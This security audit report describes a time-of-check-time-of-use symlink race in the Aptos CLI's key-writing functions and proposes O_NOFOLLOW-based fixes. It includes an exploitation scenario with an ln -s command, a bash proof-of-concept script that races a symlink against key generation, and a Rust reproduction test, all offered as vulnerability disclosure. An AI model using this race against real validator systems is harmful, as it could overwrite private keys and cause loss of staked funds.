# Audit Report

## Title
TOCTOU Race Condition in CLI File Writing Enables Symlink Attack on Validator Keys

## Summary
The Aptos CLI's `check_if_file_exists()` function contains a Time-of-Check-Time-of-Use (TOCTOU) race condition that allows an attacker to substitute files with symlinks between the existence check and the write operation. This enables overwriting arbitrary files that the CLI user has write permissions for, including validator private keys and consensus state files, potentially causing permanent loss of staked funds and consensus disruption. [1](#0-0) 

## Finding Description

The vulnerability exists in the file existence checking and writing flow:

1. **Time-of-Check**: The `check_if_file_exists()` function checks if a file exists and prompts the user for confirmation if it does. [1](#0-0) 

2. **Race Window**: After the check passes, there is a time gap during which:
   - Cryptographic keys are generated
   - YAML serialization occurs  
   - Other processing happens

3. **Time-of-Use**: The `write_to_file_with_opts()` function uses `OpenOptions::open()` which **follows symlinks by default** in Rust. [2](#0-1) 

**Critical Attack Vector - Validator Key Generation:**

The `GenerateKeys` command generates validator private keys, consensus keys, and network keys. It performs the TOCTOU-vulnerable pattern: [3](#0-2) 

Then later writes the keys: [4](#0-3) 

**Exploitation Scenario:**

1. Attacker monitors the target directory or predicts when a validator operator will generate keys
2. User runs: `aptos genesis generate-keys --output-dir ./validator-keys`
3. The CLI checks if `private-keys.yaml` exists (it doesn't)
4. **ATTACK WINDOW**: During key generation (cryptographic operations take time), attacker creates:
   ```bash
   ln -s /path/to/existing/validator/private-keys.yaml ./validator-keys/private-keys.yaml
   ```
5. The CLI calls `write_to_user_only_file()` which opens the file
6. `OpenOptions::open()` follows the symlink and overwrites the target validator's keys
7. The original validator permanently loses access to their keys and staked funds

The same vulnerability affects multiple CLI commands that generate or save sensitive files:
- Key generation commands [5](#0-4) 
- Admin writeset generation [6](#0-5) 
- Layout template generation [7](#0-6) 

## Impact Explanation

**Critical Severity** - This vulnerability qualifies for the highest severity tier under Aptos bug bounty criteria:

1. **Permanent freezing of funds (requires hardfork)**: If a validator's private keys are overwritten and no backup exists, the validator permanently loses access to staked funds. This meets the Critical severity criterion of "Permanent freezing of funds (requires hardfork)".

2. **Consensus/Safety violations**: If consensus state files or validator keys are corrupted during active operation, it can disrupt consensus by preventing validators from participating in block production and voting.

3. **Loss of Funds**: Validators unable to access their staked funds due to lost private keys represents direct financial loss.

4. **Cryptographic Correctness Invariant Violation**: The system must protect validator private keys at all costs. Allowing them to be overwritten through symlink attacks violates this fundamental security invariant.

The impact is **irreversible** - once validator keys are overwritten, there is no recovery mechanism except from backups.

## Likelihood Explanation

**Medium to High Likelihood** in certain deployment scenarios:

**High Likelihood Scenarios:**
- Shared hosting environments where multiple users have access
- Compromised systems where attacker has limited file system access
- Development/testing environments with relaxed permissions
- Automated deployment scripts running in predictable patterns

**Attack Requirements:**
- Write access to the output directory (or parent directory)
- Ability to observe or predict CLI execution timing
- Knowledge of target file names (public information: `private-keys.yaml`, etc.)

**Mitigating Factors:**
- Requires local file system access
- Typical production validators use isolated, restricted environments
- Attack timing requires some coordination

However, this represents a **defense-in-depth failure**. Security-sensitive file operations should never follow symlinks, regardless of environmental protections. An attacker who has partially compromised a system could use this to escalate by destroying validator credentials.

## Recommendation

**Immediate Fix**: Add `O_NOFOLLOW` flag to all file write operations for security-sensitive files:

```rust
use std::os::unix::fs::OpenOptionsExt;

pub fn write_to_file_with_opts(
    path: &Path,
    name: &str,
    bytes: &[u8],
    opts: &mut OpenOptions,
) -> CliTypedResult<()> {
    // Add O_NOFOLLOW on Unix to prevent symlink following
    #[cfg(unix)]
    opts.custom_flags(libc::O_NOFOLLOW);
    
    let mut file = opts
        .write(true)
        .create(true)
        .truncate(true)
        .open(path)
        .map_err(|e| CliError::IO(name.to_string(), e))?;
    file.write_all(bytes)
        .map_err(|e| CliError::IO(name.to_string(), e))
}
```

**Additional Hardening:**
1. Check if path is a symlink before opening: `path.symlink_metadata()?.file_type().is_symlink()`
2. Use `canonicalize()` on the parent directory and verify the final path stays within expected bounds
3. For Windows compatibility, implement equivalent symlink detection
4. Add explicit warnings in documentation about running CLI commands in shared directories

**Comprehensive Fix**: Update `write_to_user_only_file()` specifically:

```rust
pub fn write_to_user_only_file(path: &Path, name: &str, bytes: &[u8]) -> CliTypedResult<()> {
    // Check for symlinks before writing
    if path.exists() {
        let metadata = path.symlink_metadata()
            .map_err(|e| CliError::IO(name.to_string(), e))?;
        if metadata.file_type().is_symlink() {
            return Err(CliError::UnexpectedError(
                format!("Refusing to write to symlink: {}", path.display())
            ));
        }
    }
    
    let mut opts = OpenOptions::new();
    #[cfg(unix)]
    {
        opts.mode(0o600);
        opts.custom_flags(libc::O_NOFOLLOW);
    }
    write_to_file_with_opts(path, name, bytes, &mut opts)
}
```

## Proof of Concept

```bash
#!/bin/bash
# PoC: TOCTOU symlink attack on Aptos CLI key generation

# Setup: Create a target file we want to overwrite
mkdir -p /tmp/victim
echo "IMPORTANT_VALIDATOR_KEY" > /tmp/victim/private-keys.yaml
echo "Original content:"
cat /tmp/victim/private-keys.yaml

# Create output directory
mkdir -p /tmp/attacker-keys

# Start the CLI command in background
aptos genesis generate-keys --output-dir /tmp/attacker-keys --assume-yes &
CLI_PID=$!

# Give it a moment to start and check files
sleep 0.1

# ATTACK: Create symlink during the race window (while keys are being generated)
ln -sf /tmp/victim/private-keys.yaml /tmp/attacker-keys/private-keys.yaml

# Wait for CLI to complete
wait $CLI_PID

echo -e "\n\nAfter attack:"
cat /tmp/victim/private-keys.yaml
echo -e "\n\n[!] Victim's private key has been overwritten!"

# Cleanup
rm -rf /tmp/attacker-keys /tmp/victim
```

**Expected Result**: The victim's `private-keys.yaml` file will be overwritten with newly generated keys, demonstrating the vulnerability.

**Rust Test Reproduction**:

```rust
#[tokio::test]
async fn test_toctou_symlink_vulnerability() {
    use std::os::unix::fs::symlink;
    use tempfile::TempDir;
    
    let temp = TempDir::new().unwrap();
    let victim_file = temp.path().join("victim-keys.yaml");
    let output_dir = temp.path().join("output");
    std::fs::create_dir(&output_dir).unwrap();
    
    // Create victim file with important content
    std::fs::write(&victim_file, b"CRITICAL_VALIDATOR_KEY").unwrap();
    
    // Simulate the race condition
    let target_file = output_dir.join("private-keys.yaml");
    
    // Attack: Create symlink before write operation
    symlink(&victim_file, &target_file).unwrap();
    
    // CLI write operation (follows symlink)
    let result = write_to_user_only_file(
        &target_file,
        "test",
        b"OVERWRITTEN_CONTENT"
    );
    
    // Verify victim file was overwritten through symlink
    let victim_content = std::fs::read_to_string(&victim_file).unwrap();
    assert_eq!(victim_content, "OVERWRITTEN_CONTENT", 
        "Vulnerability: Symlink was followed and victim file was overwritten");
}
```

---

**Notes**

This vulnerability affects the broader Aptos CLI security posture. While the immediate impact requires local file system access, it represents a fundamental flaw in secure file handling that should be addressed regardless of deployment environment assumptions. The fix is straightforward (adding `O_NOFOLLOW`) and should be applied to all security-sensitive file operations throughout the CLI codebase.

### Citations

**File:** crates/aptos/src/common/utils.rs (L179-191)
```rust
pub fn check_if_file_exists(file: &Path, prompt_options: PromptOptions) -> CliTypedResult<()> {
    if file.exists() {
        prompt_yes_with_override(
            &format!(
                "{:?} already exists, are you sure you want to overwrite it?",
                file.as_os_str(),
            ),
            prompt_options,
        )?
    }

    Ok(())
}
```

**File:** crates/aptos/src/common/utils.rs (L232-246)
```rust
pub fn write_to_file_with_opts(
    path: &Path,
    name: &str,
    bytes: &[u8],
    opts: &mut OpenOptions,
) -> CliTypedResult<()> {
    let mut file = opts
        .write(true)
        .create(true)
        .truncate(true)
        .open(path)
        .map_err(|e| CliError::IO(name.to_string(), e))?;
    file.write_all(bytes)
        .map_err(|e| CliError::IO(name.to_string(), e))
}
```

**File:** crates/aptos/src/genesis/keys.rs (L64-67)
```rust
        check_if_file_exists(private_keys_file.as_path(), self.prompt_options)?;
        check_if_file_exists(public_keys_file.as_path(), self.prompt_options)?;
        check_if_file_exists(validator_file.as_path(), self.prompt_options)?;
        check_if_file_exists(vfn_file.as_path(), self.prompt_options)?;
```

**File:** crates/aptos/src/genesis/keys.rs (L82-97)
```rust
        write_to_user_only_file(
            private_keys_file.as_path(),
            PRIVATE_KEYS_FILE,
            to_yaml(&private_identity)?.as_bytes(),
        )?;
        write_to_user_only_file(
            public_keys_file.as_path(),
            PUBLIC_KEYS_FILE,
            to_yaml(&public_identity)?.as_bytes(),
        )?;
        write_to_user_only_file(
            validator_file.as_path(),
            VALIDATOR_FILE,
            to_yaml(&validator_blob)?.as_bytes(),
        )?;
        write_to_user_only_file(vfn_file.as_path(), VFN_FILE, to_yaml(&vfn_blob)?.as_bytes())?;
```

**File:** crates/aptos/src/genesis/keys.rs (L290-290)
```rust
        check_if_file_exists(self.output_file.as_path(), self.prompt_options)?;
```

**File:** crates/aptos/src/genesis/keys.rs (L328-328)
```rust
        check_if_file_exists(self.output_file.as_path(), self.prompt_options)?;
```

**File:** crates/aptos/src/op/key.rs (L422-422)
```rust
        check_if_file_exists(&self.public_key_file()?, self.file_options.prompt_options)
```
